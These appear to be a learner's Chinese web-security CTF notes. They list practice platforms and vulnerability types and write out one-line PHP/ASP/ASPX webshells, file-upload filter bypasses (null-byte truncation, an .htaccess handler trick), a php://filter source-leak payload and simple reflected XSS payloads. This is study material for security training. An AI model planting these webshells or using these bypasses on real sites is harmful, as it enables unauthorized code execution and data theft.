# WEB学习笔记


## 实战平台

- bugku
- 实验吧
- Jarvis OJ
- 国外的XSS测试：prompt.ml/0
- 国外的sql注入的挑战网站：redtiger.labs.overthewire.org

## 常见WEB漏洞

- **XSS**	
- 文件包含/上传
- **SQL注入**	
- **反序列化**
- CSRF	
- 未授权访问
- SSRF	
- 目录遍历
- 命令执行	
- 业务逻辑漏洞
- XEE

## 文件包含/上传
### 一句话木马
- php版本:	<?php eval($_POST["pwd"]);?>
- javascript:	<script language="php">@eval_r($_POST['pwd'])</script>
- asp:	<% eval request("pwd") %> 或 <%execute(request("pwd"))%> 
- asxp:	<%@ Page Lanuage="Jscript"%><%eval(Request.Item["pwd"])%>

### 1.前端检查

- 先上传jpg文件，BurpSuite中修改后缀名（将jpg改回php）绕过
- 修改文件后缀名为php3\php4\php5\phtml绕过

### 2.截断
当数据包内存在文件上传路径时，将路径末尾改为0x00，可以绕过对后面文件的检查

### 3.扩展名检查黑名单
- 利用Apache漏洞（自动略过无法解析的扩展名），将文件扩展名编辑为.php.abc
- .htaccess
在txt中写入

		<FilesMatch "attack"> SetHandler application/x-httpd-php </FilesMatch>
然后cmd中：

		ren 2.txt .htaccess
上传此文件，再上传jpg（php）,连接attack.jpg

- 利用大小写(需要win系统)
- 

??: 如何查看apache配置

## sql注入


## XFF/refer伪造
|:--:|:--:|
|X-Forwarded-For|Client, proxy1, proxy2 ...|
|Referer|......|

## php-fillter 泄露源代码
参考 *https://blog.csdn.net/qq_29419013/article/details/81201494*
phpfillter: 
?page=php://filter/read=convert.base64-encode//resource=index
查看index.php的源码



## XSS
###反射型XSS 
直接注入代码执行
常见有：
- 普通代码：<script>alert("Hello")</script>
- 截断代码：1' - alert("Hello") - '  (img标签)
- 错误执行：100'onerror=alert("Hello")>

